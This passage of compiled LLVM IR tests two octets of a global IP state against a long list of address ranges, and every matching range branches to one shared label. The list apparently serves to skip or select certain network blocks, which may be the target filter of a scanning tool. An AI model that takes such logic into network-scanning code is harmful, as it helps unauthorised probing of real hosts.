  %547 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %548 = zext i8 %547 to i32
  %549 = icmp sge i32 %548, 5
  br i1 %549, label %550, label %554

; <label>:550:                                    ; preds = %546
  %551 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %552 = zext i8 %551 to i32
  %553 = icmp slt i32 %552, 235
  br i1 %553, label %2322, label %554

; <label>:554:                                    ; preds = %550, %546, %542
  %555 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %556 = zext i8 %555 to i32
  %557 = icmp eq i32 %556, 136
  br i1 %557, label %558, label %566

; <label>:558:                                    ; preds = %554
  %559 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %560 = zext i8 %559 to i32
  %561 = icmp sge i32 %560, 177
  br i1 %561, label %562, label %566

; <label>:562:                                    ; preds = %558
  %563 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %564 = zext i8 %563 to i32
  %565 = icmp slt i32 %564, 223
  br i1 %565, label %2322, label %566

; <label>:566:                                    ; preds = %562, %558, %554
  %567 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %568 = zext i8 %567 to i32
  %569 = icmp eq i32 %568, 138
  br i1 %569, label %570, label %578

; <label>:570:                                    ; preds = %566
  %571 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %572 = zext i8 %571 to i32
  %573 = icmp sge i32 %572, 13
  br i1 %573, label %574, label %578

; <label>:574:                                    ; preds = %570
  %575 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %576 = zext i8 %575 to i32
  %577 = icmp slt i32 %576, 194
  br i1 %577, label %2322, label %578

; <label>:578:                                    ; preds = %574, %570, %566
  %579 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %580 = zext i8 %579 to i32
  %581 = icmp eq i32 %580, 139
  br i1 %581, label %582, label %590

; <label>:582:                                    ; preds = %578
  %583 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %584 = zext i8 %583 to i32
  %585 = icmp sge i32 %584, 31
  br i1 %585, label %586, label %590

; <label>:586:                                    ; preds = %582
  %587 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %588 = zext i8 %587 to i32
  %589 = icmp slt i32 %588, 143
  br i1 %589, label %2322, label %590

; <label>:590:                                    ; preds = %586, %582, %578
  %591 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %592 = zext i8 %591 to i32
  %593 = icmp eq i32 %592, 140
  br i1 %593, label %594, label %602

; <label>:594:                                    ; preds = %590
  %595 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %596 = zext i8 %595 to i32
  %597 = icmp sge i32 %596, 1
  br i1 %597, label %598, label %602

; <label>:598:                                    ; preds = %594
  %599 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %600 = zext i8 %599 to i32
  %601 = icmp slt i32 %600, 203
  br i1 %601, label %2322, label %602

; <label>:602:                                    ; preds = %598, %594, %590
  %603 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %604 = zext i8 %603 to i32
  %605 = icmp eq i32 %604, 143
  br i1 %605, label %606, label %614

; <label>:606:                                    ; preds = %602
  %607 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %608 = zext i8 %607 to i32
  %609 = icmp sge i32 %608, 45
  br i1 %609, label %610, label %614

; <label>:610:                                    ; preds = %606
  %611 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %612 = zext i8 %611 to i32
  %613 = icmp slt i32 %612, 233
  br i1 %613, label %2322, label %614

; <label>:614:                                    ; preds = %610, %606, %602
  %615 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %616 = zext i8 %615 to i32
  %617 = icmp eq i32 %616, 144
  br i1 %617, label %618, label %626

; <label>:618:                                    ; preds = %614
  %619 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %620 = zext i8 %619 to i32
  %621 = icmp sge i32 %620, 99
  br i1 %621, label %622, label %626

; <label>:622:                                    ; preds = %618
  %623 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %624 = zext i8 %623 to i32
  %625 = icmp slt i32 %624, 253
  br i1 %625, label %2322, label %626

; <label>:626:                                    ; preds = %622, %618, %614
  %627 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %628 = zext i8 %627 to i32
  %629 = icmp eq i32 %628, 146
  br i1 %629, label %630, label %638

; <label>:630:                                    ; preds = %626
  %631 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %632 = zext i8 %631 to i32
  %633 = icmp sge i32 %632, 165
  br i1 %633, label %634, label %638

; <label>:634:                                    ; preds = %630
  %635 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %636 = zext i8 %635 to i32
  %637 = icmp slt i32 %636, 166
  br i1 %637, label %2322, label %638

; <label>:638:                                    ; preds = %634, %630, %626
  %639 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %640 = zext i8 %639 to i32
  %641 = icmp eq i32 %640, 147
  br i1 %641, label %642, label %650

; <label>:642:                                    ; preds = %638
  %643 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %644 = zext i8 %643 to i32
  %645 = icmp sge i32 %644, 35
  br i1 %645, label %646, label %650

; <label>:646:                                    ; preds = %642
  %647 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %648 = zext i8 %647 to i32
  %649 = icmp slt i32 %648, 43
  br i1 %649, label %2322, label %650

; <label>:650:                                    ; preds = %646, %642, %638
  %651 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %652 = zext i8 %651 to i32
  %653 = icmp eq i32 %652, 147
  br i1 %653, label %654, label %662

; <label>:654:                                    ; preds = %650
  %655 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %656 = zext i8 %655 to i32
  %657 = icmp sge i32 %656, 103
  br i1 %657, label %658, label %662

; <label>:658:                                    ; preds = %654
  %659 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %660 = zext i8 %659 to i32
  %661 = icmp slt i32 %660, 105
  br i1 %661, label %2322, label %662

; <label>:662:                                    ; preds = %658, %654, %650
  %663 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %664 = zext i8 %663 to i32
  %665 = icmp eq i32 %664, 147
  br i1 %665, label %666, label %674

; <label>:666:                                    ; preds = %662
  %667 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %668 = zext i8 %667 to i32
  %669 = icmp sge i32 %668, 168
  br i1 %669, label %670, label %674

; <label>:670:                                    ; preds = %666
  %671 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %672 = zext i8 %671 to i32
  %673 = icmp slt i32 %672, 170
  br i1 %673, label %2322, label %674

; <label>:674:                                    ; preds = %670, %666, %662
  %675 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %676 = zext i8 %675 to i32
  %677 = icmp eq i32 %676, 147
  br i1 %677, label %678, label %686

; <label>:678:                                    ; preds = %674
  %679 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %680 = zext i8 %679 to i32
  %681 = icmp sge i32 %680, 198
  br i1 %681, label %682, label %686

; <label>:682:                                    ; preds = %678
  %683 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %684 = zext i8 %683 to i32
  %685 = icmp slt i32 %684, 200
  br i1 %685, label %2322, label %686

; <label>:686:                                    ; preds = %682, %678, %674
  %687 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %688 = zext i8 %687 to i32
  %689 = icmp eq i32 %688, 147
  br i1 %689, label %690, label %698

; <label>:690:                                    ; preds = %686
  %691 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %692 = zext i8 %691 to i32
  %693 = icmp sge i32 %692, 238
  br i1 %693, label %694, label %698

; <label>:694:                                    ; preds = %690
  %695 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %696 = zext i8 %695 to i32
  %697 = icmp slt i32 %696, 255
  br i1 %697, label %2322, label %698

; <label>:698:                                    ; preds = %694, %690, %686
  %699 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %700 = zext i8 %699 to i32
  %701 = icmp eq i32 %700, 150
  br i1 %701, label %702, label %710

; <label>:702:                                    ; preds = %698
  %703 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %704 = zext i8 %703 to i32
  %705 = icmp sge i32 %704, 113
  br i1 %705, label %706, label %710

; <label>:706:                                    ; preds = %702
  %707 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %708 = zext i8 %707 to i32
  %709 = icmp slt i32 %708, 115
  br i1 %709, label %2322, label %710

; <label>:710:                                    ; preds = %706, %702, %698
  %711 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %712 = zext i8 %711 to i32
  %713 = icmp eq i32 %712, 152
  br i1 %713, label %714, label %722

; <label>:714:                                    ; preds = %710
  %715 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %716 = zext i8 %715 to i32
  %717 = icmp sge i32 %716, 151
  br i1 %717, label %718, label %722

; <label>:718:                                    ; preds = %714
  %719 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %720 = zext i8 %719 to i32
  %721 = icmp slt i32 %720, 155
  br i1 %721, label %2322, label %722

; <label>:722:                                    ; preds = %718, %714, %710
  %723 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %724 = zext i8 %723 to i32
  %725 = icmp eq i32 %724, 153
  br i1 %725, label %726, label %734

; <label>:726:                                    ; preds = %722
  %727 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %728 = zext i8 %727 to i32
  %729 = icmp sge i32 %728, 21
  br i1 %729, label %730, label %734

; <label>:730:                                    ; preds = %726
  %731 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %732 = zext i8 %731 to i32
  %733 = icmp slt i32 %732, 32
  br i1 %733, label %2322, label %734

; <label>:734:                                    ; preds = %730, %726, %722
  %735 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %736 = zext i8 %735 to i32
  %737 = icmp eq i32 %736, 155
  br i1 %737, label %738, label %746

; <label>:738:                                    ; preds = %734
  %739 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %740 = zext i8 %739 to i32
  %741 = icmp sge i32 %740, 5
  br i1 %741, label %742, label %746

; <label>:742:                                    ; preds = %738
  %743 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %744 = zext i8 %743 to i32
  %745 = icmp slt i32 %744, 10
  br i1 %745, label %2322, label %746

; <label>:746:                                    ; preds = %742, %738, %734
  %747 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %748 = zext i8 %747 to i32
  %749 = icmp eq i32 %748, 155
  br i1 %749, label %750, label %758

; <label>:750:                                    ; preds = %746
  %751 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %752 = zext i8 %751 to i32
  %753 = icmp sge i32 %752, 74
  br i1 %753, label %754, label %758

; <label>:754:                                    ; preds = %750
  %755 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %756 = zext i8 %755 to i32
  %757 = icmp slt i32 %756, 89
  br i1 %757, label %2322, label %758

; <label>:758:                                    ; preds = %754, %750, %746
  %759 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %760 = zext i8 %759 to i32
  %761 = icmp eq i32 %760, 155
  br i1 %761, label %762, label %770

; <label>:762:                                    ; preds = %758
  %763 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %764 = zext i8 %763 to i32
  %765 = icmp sge i32 %764, 213
  br i1 %765, label %766, label %770

; <label>:766:                                    ; preds = %762
  %767 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %768 = zext i8 %767 to i32
  %769 = icmp slt i32 %768, 222
  br i1 %769, label %2322, label %770

; <label>:770:                                    ; preds = %766, %762, %758
  %771 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %772 = zext i8 %771 to i32
  %773 = icmp eq i32 %772, 157
  br i1 %773, label %774, label %782

; <label>:774:                                    ; preds = %770
  %775 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %776 = zext i8 %775 to i32
  %777 = icmp sge i32 %776, 150
  br i1 %777, label %778, label %782

; <label>:778:                                    ; preds = %774
  %779 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %780 = zext i8 %779 to i32
  %781 = icmp slt i32 %780, 154
  br i1 %781, label %2322, label %782

; <label>:782:                                    ; preds = %778, %774, %770
  %783 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %784 = zext i8 %783 to i32
  %785 = icmp eq i32 %784, 158
  br i1 %785, label %786, label %794

; <label>:786:                                    ; preds = %782
  %787 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %788 = zext i8 %787 to i32
  %789 = icmp sge i32 %788, 1
  br i1 %789, label %790, label %794

; <label>:790:                                    ; preds = %786
  %791 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %792 = zext i8 %791 to i32
  %793 = icmp slt i32 %792, 21
  br i1 %793, label %2322, label %794

; <label>:794:                                    ; preds = %790, %786, %782
  %795 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %796 = zext i8 %795 to i32
  %797 = icmp eq i32 %796, 158
  br i1 %797, label %798, label %806

; <label>:798:                                    ; preds = %794
  %799 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %800 = zext i8 %799 to i32
  %801 = icmp sge i32 %800, 235
  br i1 %801, label %802, label %806

; <label>:802:                                    ; preds = %798
  %803 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %804 = zext i8 %803 to i32
  %805 = icmp slt i32 %804, 247
  br i1 %805, label %2322, label %806

; <label>:806:                                    ; preds = %802, %798, %794
  %807 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %808 = zext i8 %807 to i32
  %809 = icmp eq i32 %808, 159
  br i1 %809, label %810, label %818

; <label>:810:                                    ; preds = %806
  %811 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %812 = zext i8 %811 to i32
  %813 = icmp sge i32 %812, 120
  br i1 %813, label %814, label %818

; <label>:814:                                    ; preds = %810
  %815 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %816 = zext i8 %815 to i32
  %817 = icmp slt i32 %816, 121
  br i1 %817, label %2322, label %818

; <label>:818:                                    ; preds = %814, %810, %806
  %819 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %820 = zext i8 %819 to i32
  %821 = icmp eq i32 %820, 160
  br i1 %821, label %822, label %830

; <label>:822:                                    ; preds = %818
  %823 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %824 = zext i8 %823 to i32
  %825 = icmp sge i32 %824, 132
  br i1 %825, label %826, label %830

; <label>:826:                                    ; preds = %822
  %827 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %828 = zext i8 %827 to i32
  %829 = icmp slt i32 %828, 151
  br i1 %829, label %2322, label %830

; <label>:830:                                    ; preds = %826, %822, %818
  %831 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %832 = zext i8 %831 to i32
  %833 = icmp eq i32 %832, 64
  br i1 %833, label %834, label %842

; <label>:834:                                    ; preds = %830
  %835 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %836 = zext i8 %835 to i32
  %837 = icmp sge i32 %836, 224
  br i1 %837, label %838, label %842

; <label>:838:                                    ; preds = %834
  %839 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %840 = zext i8 %839 to i32
  %841 = icmp slt i32 %840, 227
  br i1 %841, label %2322, label %842

; <label>:842:                                    ; preds = %838, %834, %830
  %843 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %844 = zext i8 %843 to i32
  %845 = icmp eq i32 %844, 162
  br i1 %845, label %846, label %854

; <label>:846:                                    ; preds = %842
  %847 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %848 = zext i8 %847 to i32
  %849 = icmp sge i32 %848, 45
  br i1 %849, label %850, label %854

; <label>:850:                                    ; preds = %846
  %851 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %852 = zext i8 %851 to i32
  %853 = icmp slt i32 %852, 47
  br i1 %853, label %2322, label %854

; <label>:854:                                    ; preds = %850, %846, %842
  %855 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %856 = zext i8 %855 to i32
  %857 = icmp eq i32 %856, 163
  br i1 %857, label %858, label %866

; <label>:858:                                    ; preds = %854
  %859 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %860 = zext i8 %859 to i32
  %861 = icmp sge i32 %860, 205
  br i1 %861, label %862, label %866

; <label>:862:                                    ; preds = %858
  %863 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %864 = zext i8 %863 to i32
  %865 = icmp slt i32 %864, 207
  br i1 %865, label %2322, label %866

; <label>:866:                                    ; preds = %862, %858, %854
  %867 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %868 = zext i8 %867 to i32
  %869 = icmp eq i32 %868, 164
  br i1 %869, label %870, label %878

; <label>:870:                                    ; preds = %866
  %871 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %872 = zext i8 %871 to i32
  %873 = icmp sge i32 %872, 45
  br i1 %873, label %874, label %878

; <label>:874:                                    ; preds = %870
  %875 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %876 = zext i8 %875 to i32
  %877 = icmp slt i32 %876, 50
  br i1 %877, label %2322, label %878

; <label>:878:                                    ; preds = %874, %870, %866
  %879 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %880 = zext i8 %879 to i32
  %881 = icmp eq i32 %880, 164
  br i1 %881, label %882, label %890

; <label>:882:                                    ; preds = %878
  %883 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %884 = zext i8 %883 to i32
  %885 = icmp sge i32 %884, 217
  br i1 %885, label %886, label %890

; <label>:886:                                    ; preds = %882
  %887 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %888 = zext i8 %887 to i32
  %889 = icmp slt i32 %888, 233
  br i1 %889, label %2322, label %890

; <label>:890:                                    ; preds = %886, %882, %878
  %891 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %892 = zext i8 %891 to i32
  %893 = icmp eq i32 %892, 169
  br i1 %893, label %894, label %902

; <label>:894:                                    ; preds = %890
  %895 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %896 = zext i8 %895 to i32
  %897 = icmp sge i32 %896, 252
  br i1 %897, label %898, label %902

; <label>:898:                                    ; preds = %894
  %899 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %900 = zext i8 %899 to i32
  %901 = icmp slt i32 %900, 254
  br i1 %901, label %2322, label %902

; <label>:902:                                    ; preds = %898, %894, %890
  %903 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %904 = zext i8 %903 to i32
  %905 = icmp eq i32 %904, 199
  br i1 %905, label %906, label %914

; <label>:906:                                    ; preds = %902
  %907 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %908 = zext i8 %907 to i32
  %909 = icmp sge i32 %908, 121
  br i1 %909, label %910, label %914

; <label>:910:                                    ; preds = %906
  %911 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %912 = zext i8 %911 to i32
  %913 = icmp slt i32 %912, 254
  br i1 %913, label %2322, label %914

; <label>:914:                                    ; preds = %910, %906, %902
  %915 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %916 = zext i8 %915 to i32
  %917 = icmp eq i32 %916, 205
  br i1 %917, label %918, label %926

; <label>:918:                                    ; preds = %914
  %919 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %920 = zext i8 %919 to i32
  %921 = icmp sge i32 %920, 1
  br i1 %921, label %922, label %926

; <label>:922:                                    ; preds = %918
  %923 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %924 = zext i8 %923 to i32
  %925 = icmp slt i32 %924, 118
  br i1 %925, label %2322, label %926

; <label>:926:                                    ; preds = %922, %918, %914
  %927 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %928 = zext i8 %927 to i32
  %929 = icmp eq i32 %928, 207
  br i1 %929, label %930, label %938

; <label>:930:                                    ; preds = %926
  %931 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %932 = zext i8 %931 to i32
  %933 = icmp sge i32 %932, 60
  br i1 %933, label %934, label %938

; <label>:934:                                    ; preds = %930
  %935 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %936 = zext i8 %935 to i32
  %937 = icmp slt i32 %936, 62
  br i1 %937, label %2322, label %938

; <label>:938:                                    ; preds = %934, %930, %926
  %939 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %940 = zext i8 %939 to i32
  %941 = icmp eq i32 %940, 104
  br i1 %941, label %942, label %950

; <label>:942:                                    ; preds = %938
  %943 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %944 = zext i8 %943 to i32
  %945 = icmp sge i32 %944, 16
  br i1 %945, label %946, label %950

; <label>:946:                                    ; preds = %942
  %947 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %948 = zext i8 %947 to i32
  %949 = icmp slt i32 %948, 31
  br i1 %949, label %2322, label %950

; <label>:950:                                    ; preds = %946, %942, %938
  %951 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %952 = zext i8 %951 to i32
  %953 = icmp eq i32 %952, 188
  br i1 %953, label %954, label %958

; <label>:954:                                    ; preds = %950
  %955 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %956 = zext i8 %955 to i32
  %957 = icmp eq i32 %956, 166
  br i1 %957, label %2322, label %958

; <label>:958:                                    ; preds = %954, %950
  %959 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %960 = zext i8 %959 to i32
  %961 = icmp eq i32 %960, 188
  br i1 %961, label %962, label %966

; <label>:962:                                    ; preds = %958
  %963 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %964 = zext i8 %963 to i32
  %965 = icmp eq i32 %964, 226
  br i1 %965, label %2322, label %966

; <label>:966:                                    ; preds = %962, %958
  %967 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %968 = zext i8 %967 to i32
  %969 = icmp eq i32 %968, 159
  br i1 %969, label %970, label %974

; <label>:970:                                    ; preds = %966
  %971 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %972 = zext i8 %971 to i32
  %973 = icmp eq i32 %972, 203
  br i1 %973, label %2322, label %974

; <label>:974:                                    ; preds = %970, %966
  %975 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %976 = zext i8 %975 to i32
  %977 = icmp eq i32 %976, 162
  br i1 %977, label %978, label %982

; <label>:978:                                    ; preds = %974
  %979 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %980 = zext i8 %979 to i32
  %981 = icmp eq i32 %980, 243
  br i1 %981, label %2322, label %982

; <label>:982:                                    ; preds = %978, %974
  %983 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %984 = zext i8 %983 to i32
  %985 = icmp eq i32 %984, 45
  br i1 %985, label %986, label %990

; <label>:986:                                    ; preds = %982
  %987 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %988 = zext i8 %987 to i32
  %989 = icmp eq i32 %988, 55
  br i1 %989, label %2322, label %990

; <label>:990:                                    ; preds = %986, %982
  %991 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 0), align 1
  %992 = zext i8 %991 to i32
  %993 = icmp eq i32 %992, 178
  br i1 %993, label %994, label %998

; <label>:994:                                    ; preds = %990
  %995 = load i8, i8* getelementptr inbounds ([4 x i8], [4 x i8]* @GIP.ipState, i64 0, i64 1), align 1
  %996 = zext i8 %995 to i32
  %997 = icmp eq i32 %996, 62
  br i1 %997, label %2322, label %998

; <label>:998:                                    ; preds = %994, %990
